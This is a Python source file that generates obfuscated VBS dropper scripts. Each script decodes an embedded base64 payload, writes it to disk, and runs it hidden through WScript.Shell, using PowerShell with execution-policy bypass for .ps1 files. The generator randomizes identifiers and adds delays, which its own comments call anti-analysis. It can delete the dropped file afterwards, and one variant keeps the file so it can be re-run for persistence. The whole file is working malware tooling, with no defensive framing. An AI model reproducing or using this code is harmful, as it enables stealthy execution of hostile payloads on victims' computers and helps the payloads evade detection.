#!/usr/bin/env python3
"""
Core VBS payload generator — produces clean, working VBS scripts that:
1. Embed file content as base64 string
2. Decode with MSXML2.DOMDocument bin.base64
3. Write binary to disk with ADODB.Stream
4. Execute via WScript.Shell
5. Clean up after execution

Matches the structure of known-working VBS payloads.
"""

import random
import string


def _rand_name(length=10):
    return random.choice(string.ascii_lowercase) + ''.join(
        random.choices(string.ascii_lowercase + string.digits, k=length - 1)
    )


def _rand_filename(ext='.ps1'):
    return _rand_name(8) + ext


def generate_self_extracting_vbs(
    base64_data: str,
    original_filename: str,
    write_dir: str = 'MyDocuments',
    cleanup: bool = True,
    delays: bool = True,
    delay_min: int = 2000,
    delay_max: int = 5000,
) -> str:
    """Generate a complete self-extracting VBS payload.

    Args:
        base64_data: Base64-encoded file content
        original_filename: Original filename (used to determine extension)
        write_dir: VBS SpecialFolders name or 'temp' for %TEMP%
        cleanup: Whether to delete the extracted file after execution
        delays: Whether to add anti-analysis random delays
        delay_min: Minimum delay in milliseconds
        delay_max: Maximum delay in milliseconds

    Returns:
        Complete VBS script as a string
    """
    import os
    ext = os.path.splitext(original_filename)[1].lower()
    drop_name = _rand_filename(ext)

    v_shell = _rand_name()
    v_fso = _rand_name()
    v_b64 = _rand_name()
    v_decoded = _rand_name()
    v_filepath = _rand_name()
    v_cmd = _rand_name()
    fn_decode = 'DecodeBase64With' + _rand_name(6)
    fn_write = 'WriteBinaryTo' + _rand_name(6)
    fn_delay = 'RndDelay' + _rand_name(4)

    if write_dir == 'temp':
        path_expr = f'{v_shell}.ExpandEnvironmentStrings("%temp%") & "\\{drop_name}"'
    else:
        path_expr = f'{v_shell}.SpecialFolders("{write_dir}") & "\\{drop_name}"'

    if ext in ('.ps1',):
        run_cmd = (
            f'"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File ""{""}" '
            f'& {v_filepath} & ""{""}"'
        )
        run_expr = f'{v_cmd} = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File " & Chr(34) & {v_filepath} & Chr(34)'
    elif ext in ('.bat', '.cmd'):
        run_expr = f'{v_cmd} = "cmd /c " & Chr(34) & {v_filepath} & Chr(34)'
    else:
        run_expr = f'{v_cmd} = Chr(34) & {v_filepath} & Chr(34)'

    delay_calls = ''
    if delays:
        delay_calls = f'{fn_delay} {delay_min}, {delay_max}\n'

    cleanup_block = ''
    if cleanup:
        cleanup_block = f"""
{delay_calls}{delay_calls}{delay_calls}
Set {v_fso} = CreateObject("Scripting.FileSystemObject")
If {v_fso}.FileExists({v_filepath}) Then
    {v_fso}.DeleteFile {v_filepath}
End If
Set {v_fso} = Nothing"""

    vbs = f"""Set {v_shell} = CreateObject("WScript.Shell")

{v_b64} = "{base64_data}"
{v_decoded} = {fn_decode}({v_b64})

{v_filepath} = {path_expr}
{fn_write} {v_filepath}, {v_decoded}

{delay_calls}{v_cmd} = ""
{run_expr}
{v_shell}.Run {v_cmd}, 0, False

{delay_calls}{cleanup_block}

Set {v_shell} = Nothing

Function {fn_decode}(base64Str)
    Dim objXML, objNode

    Set objXML = CreateObject("MSXML2.DOMDocument")
    Set objNode = objXML.CreateElement("b64")
    objNode.DataType = "bin.base64"
    objNode.Text = base64Str

    {fn_decode} = objNode.nodeTypedValue
End Function

Sub {fn_write}(filePath, binaryData)
    Dim objStream
    Set objStream = CreateObject("ADODB.Stream")

    objStream.Type = 1
    objStream.Open
    objStream.Write binaryData

    objStream.SaveToFile filePath, 2

    objStream.Close
    Set objStream = Nothing
End Sub

Sub {fn_delay}(mn, mx)
    Randomize
    Dim dt
    dt = Int((mx - mn + 1) * Rnd + mn)
    WScript.Sleep dt
End Sub
"""
    return vbs.strip()


def generate_persistent_vbs(
    base64_data: str,
    original_filename: str,
    persistence_cmd: str = None,
) -> str:
    """Generate self-extracting VBS that writes to a permanent location.

    Returns (vbs_code, execution_command) where execution_command is the
    command that persistence layers should use to re-run the file.
    This version does NOT clean up the file since persistence needs it.
    """
    import os
    ext = os.path.splitext(original_filename)[1].lower()
    drop_name = _rand_filename(ext)

    vbs = generate_self_extracting_vbs(
        base64_data=base64_data,
        original_filename=original_filename,
        write_dir='MyDocuments',
        cleanup=False,
        delays=True,
    )

    if persistence_cmd is None:
        if ext in ('.ps1',):
            persistence_cmd = f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + drop_name + '"'
        elif ext in ('.bat', '.cmd'):
            persistence_cmd = f'cmd /c "' + drop_name + '"'
        else:
            persistence_cmd = f'"' + drop_name + '"'

    return vbs, persistence_cmd
